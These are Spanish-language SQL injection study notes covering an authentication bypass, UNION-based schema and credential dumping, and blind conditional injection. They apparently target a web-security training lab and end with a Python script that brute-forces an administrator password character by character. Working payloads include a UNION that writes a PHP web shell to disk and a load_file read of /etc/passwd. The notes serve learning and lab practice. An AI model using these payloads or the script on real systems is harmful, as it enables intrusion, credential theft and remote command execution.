
### BYPASS Basico
---
```sql
SELECT * FROM {data_name} WHERE {column}='%s' AND {column2})='data';

SELECT * FROM users WHERE username='Example' or 1=1-- -' AND password='password';
```

### SQL Injection UNION
---
Lo primero que debemos hacer para averiguar cuantas columnas puede tener una tabla, o cuantas se estan seleccionando, se puede comenzar a probar cuantas columnas se estan llamando con la sig iyección.

```SQL
SELECT {column1}, {column2} FROM {data_name} WHERE {some_query}='%s';

SELECT username, password FROM users WHERE cookie='cookie' ORDER BY 4-- -'
-- Unknown column '4' in 'order clause'
SELECT username, password FROM users WHERE cookie='cookie' ORDER BY 2-- -'
```

Una vez que conseguimos saber cuantos campos se estan seleccionando por detras, lo podemos utilizar para ahora si, usar el ataque UNION, esto es necesario ya que solo se podra hacer un union sabiendo exactamente las columnas seleccionadas por detras.

```SQL
SELECT {column1}, {column2} FROM {data_name} WHERE {some_query}='%s';

SELECT username, password FROM users WHERE cookie='cookie' UNION SELECT NULL,NULL;-- -'

-- Ahora podriamos ingresar strings para de esta manera empezar a filtrar datos.

SELECT username, email FROM users WHERE x='%s' UNION SELECT version(),null;-- -';
-- De esta manera estamos inyectando información de la version de sql en el campo solicitado, en ete ejemplo (username), devolviendo asi, no solo el username, ejemplo "admin" si no tmb por ejemplo, concatenado a esto PostgreSQL 14.4 (Debian 14.4-1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 11.3.0-3) 11.3.0, 64-bit
```

Con esto hay muchos conceptos que podriamos aplicar, como escribir un archivo en el sistema, ingresando una sentencia php:

```SQL
SELECT username, email FROM users WHERE x='%s' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL INTO outfile "/tmp/example.txt"-- -';
```

O para leer archivos propios del sistema :

```SQL
SELECT username, email FROM users WHERE x='%s' UNION SELECT load_file("/etc/passwd"), NULL-- -';
```

O para listar las base de datos:

```SQL
SELECT x, y FROM t WHERE d='%s' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -'
```

Y una vez teniendo todas las base de datos, podemos intentar listar las tablas de una base de datos en especifica:

```SQL
SELECT x, y FROM t WHERE d='%s' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='db_dumpeada'-- -';
```

Para asi, una vez teniendo las tablas de una base de datos en particular, poder dumpear las columnas:

```SQL
SELECT x, y FROM t WHERE d='%s' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='db_dumpeada' AND table_name='table_dumpeada'-- -';
```

Y así, teniendo las columnas de la tabla de una base de datos, podemos asi, dumpear los datos:

```SQL
SELECT {column_dumpeada1}, {column_dumpeada2} FROM {table_dumpeada} WHERE d='%s' UNION SELECT username, passoword-- -';
```

#### Ejemplo:

```SQL
select username, password from users where username='Admin' union select null, username||":"||password from users;-- -' and password='password';

select email, password from users where username='Owen' union select group_concat(email,':',password),null from users;-- -' and password='password';

-- Si tirase error el group_concat, se puede probar ||":"|| o ||0x3a||

```
---
# Blind Injections

## Conditionals Response

Esto ocurre cuando los errores causados por inyecciones sql no se ven, por lo que hay que obtenerlos, por ejemplo, si la vulnerabilidad se tratase en una query llamada "TrackingId".
 
### Ejemplo:

```SQL
SELECT * FROM products WHERE TrackingId='R6IxX1tiUucyn6LL'
```

Al agregarle la comilla a la query ' para que rompa la petición

```SQL
SELECT * FROM products WHERE TrackingId='R6IxX1tiUucyn6LL''
```

El error no es visible en la web porque es a CIEGAS=BLIND, pero se genera el error y desaparece un apartado o mensaje en la web, esto justamente es lo que le da el nombre a la vulnerabilidad "conditional", dependiendo de si hay un error o no, muestra algo o no.

Esto lo podemos usar para jugar con peticiones #true y #false y basarnos de si la respuesta se ve o no para corroborar si la petición enviada por detras se cumple o no, por ejemplo:

```SQL
SELECT * FROM products WHERE TrackingId='R6IxX1tiUucyn6LL' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

De esta manera estamos inyectando una nueva query en donde seleccionamos la letra a de la tabla users del usuario administrator (Recordemos que aquellos valores falsos o errores hacen desaparecer un mensaje o apartado de la web), de esta manera podemos entender que caracter por caracter tenemos una manera potencial de verifica si el username, o password,  o sea cual sea la columna, es correcta, permitiendonos asi, con herramientas como burpsuite o creando script en python, hacer un descubrimiento de la contraseña del usuario administrador.

```SQL
-- La primera posición del username del usuario administrator es 'a'
SELECT * FROM products WHERE TrackingId='R6IxX1tiUucyn6LL' AND (SELECT substring(username,1,1) FROM users WHERE username='Administrator')='a'-- -

-- La primera posición de la password del usuario administrator es 'a'
SELECT * FROM products WHERE TrackingId='R6IxX1tiUucyn6LL' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a
```

Incluso podriamos ir descubriendo la longitud de la contraseña:

```SQL
SELECT * FROM products WHERE TrackingId='q3XzfKFtNBf4dtNv' AND (SELECT 'a' FROM users WHERE username='administrator' AND length(password)>=20)='a
```



### Script en python ejemplo:

```python
#!/usr/bin/python3
from pwn import *
import requests, signal, time, pdb, sys, string

########################################
############# CONTROL + C ##############
########################################

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

########################################
########## VARIABLES GLOBALES ##########
########################################

main_url="https://0add006403a236e0c0f91f900081009f.web-security-academy.net"
characters= string.ascii_lowercase + string.digits

########################################

def makeRequests():

	password=""
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")
	
	time.sleep(2)
	
	p2 = log.progress("Password")

	for position in range(1, 21):
		for character in characters:
			cookies = {
				"TrackingId": "9BTAXg9CWgueJePm' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
				"session": "0aUi1LOYfRGtiE7K3VGivY8x3r8f548j"
			}
			p1.status(cookies['TrackingId'])

			r = requests.get(main_url, cookies=cookies)

			if "MENSAJE QUE DESAPARECE" in r.text:
				password += character
				p2.status(password)
				break

if __name__ == "__main__":
	makeRequests()
```